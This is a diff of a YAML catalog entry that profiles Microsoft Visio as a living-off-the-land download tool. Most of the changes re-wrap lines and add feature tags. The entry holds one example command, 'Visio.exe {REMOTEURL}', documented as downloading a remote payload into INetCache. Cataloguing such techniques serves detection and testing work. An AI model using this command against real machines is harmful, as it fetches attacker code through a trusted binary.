@@ -2,7 +2,9 @@
 id: windows-download-visio
 namespace: windows:download:visio
 name: visio
-description: 'Microsoft Visio Executable Located at: C:\Program Files (x86)\Microsoft Office\Office14\Visio.exe; C:\Program Files\Microsoft Office\Office14\Visio.exe; C:\Program Files (x86)\Microsoft Office\Office15\Visio.exe.'
+description: 'Microsoft Visio Executable Located at: C:\Program Files (x86)\Microsoft
+  Office\Office14\Visio.exe; C:\Program Files\Microsoft Office\Office14\Visio.exe;
+  C:\Program Files (x86)\Microsoft Office\Office15\Visio.exe.'
 author: Avihay Eldad
 version: 1.0.0
 capabilities:
@@ -41,7 +43,12 @@ resource_profile:
 allowed-tools:
 - visio
 parameters: []
-features: []
+features:
+- file-system
+- local
+- network-intensive
+- pipes-stdin
+- pipes-stdout
 execution:
   template: visio
   sandbox: execFile
@@ -49,7 +56,8 @@ execution:
   shell: false
 global_vars: {}
 examples:
-- description: Downloads payload from remote server (It will download a remote payload and place it in INetCache.)
+- description: Downloads payload from remote server (It will download a remote payload
+    and place it in INetCache.)
   command: Visio.exe {REMOTEURL}
 references: []
 techniques:
@@ -67,7 +75,6 @@ install:
   commands:
   - choco install visio
 ---
-
 
 # visio
 
